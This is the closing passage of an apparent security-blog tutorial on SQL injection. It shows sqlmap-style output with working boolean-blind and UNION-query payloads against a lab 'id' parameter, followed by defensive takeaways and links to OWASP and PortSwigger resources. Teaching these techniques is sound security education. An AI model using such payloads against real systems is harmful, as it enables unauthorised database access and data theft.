</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Parameter: id <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: boolean-based blind
</span></span><span style=display:flex><span>    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span><span style=display:flex><span>    Payload: id<span style=color:#f92672>=</span>1<span style=color:#e6db74>&#39; AND 8735=8735 AND &#39;</span>x<span style=color:#e6db74>&#39;=&#39;</span>x&amp;Submit<span style=color:#f92672>=</span>Submit
</span></span><span style=display:flex><span>    Type: UNION query
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0 UNION query <span style=color:#f92672>(</span>information_schema<span style=color:#f92672>)</span> - WHERE or HAVING clause
</span></span><span style=display:flex><span>    Payload: id<span style=color:#f92672>=</span>1<span style=color:#960050;background-color:#1e0010>&#39;</span> UNION ALL SELECT NULL,NULL,NULL,CONCAT<span style=color:#f92672>(</span>0x7176787671,0x615a5370454e6f68497977,0x7176626271<span style=color:#f92672>)</span>,NULL-- x&amp;Submit<span style=color:#f92672>=</span>Submit
</span></span></code></pre></div><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>SQL injection remains a critical vulnerability in web applications. Understanding both attack and defense techniques is essential for security professionals.</p><h3 id=next-steps>Next Steps<a hidden class=anchor aria-hidden=true href=#next-steps>#</a></h3><ol><li>Practice on <strong>Hack The Box</strong> machines (Lame, Legacy, Blue)</li><li>Study <strong>NoSQL injection</strong> techniques (MongoDB, CouchDB)</li><li>Learn about <strong>second-order SQL injection</strong> (stored and executed later)</li><li>Explore <strong>LDAP injection</strong> and <strong>XML injection</strong></li><li>Integrate security testing into <strong>CI/CD pipelines</strong></li></ol><h3 id=additional-resources>Additional Resources<a hidden class=anchor aria-hidden=true href=#additional-resources>#</a></h3><ul><li><a href=https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>OWASP SQL Injection Prevention Cheat Sheet</a></li><li><a href=https://portswigger.net/web-security/sql-injection>PortSwigger SQL Injection Academy</a></li><li><a href=https://sqlmap.org/usage.html>SQLMap User Manual</a></li><li><a href=https://www.sans.org/white-papers/3142/>Database Security Best Practices</a></li><li><a href=https://cwe.mitre.org/data/definitions/89.html>CWE-89: Improper Neutralization of Special Elements</a></li></ul><h3 id=key-takeaways>Key Takeaways<a hidden class=anchor aria-hidden=true href=#key-takeaways>#</a></h3><ul><li>SQL injection is still one of the most critical web vulnerabilities</li><li>Prepared statements are the most effective defense</li><li>Never trust user input, always validate and sanitize</li><li>Use least privilege for database accounts</li><li>Test regularly with both manual and automated techniques</li></ul><h3 id=tags>Tags<a hidden class=anchor aria-hidden=true href=#tags>#</a></h3><p>{{tool &ldquo;sql injection&rdquo;}} {{tool &ldquo;secure coding&rdquo;}} {{tool &ldquo;database security&rdquo;}} {{tool &ldquo;penetration testing&rdquo;}} {{tool &ldquo;owasp&rdquo;}}</p><p><em>Happy learning! Stay curious and keep practicing.</em></p></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Hri7ik H4cks</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>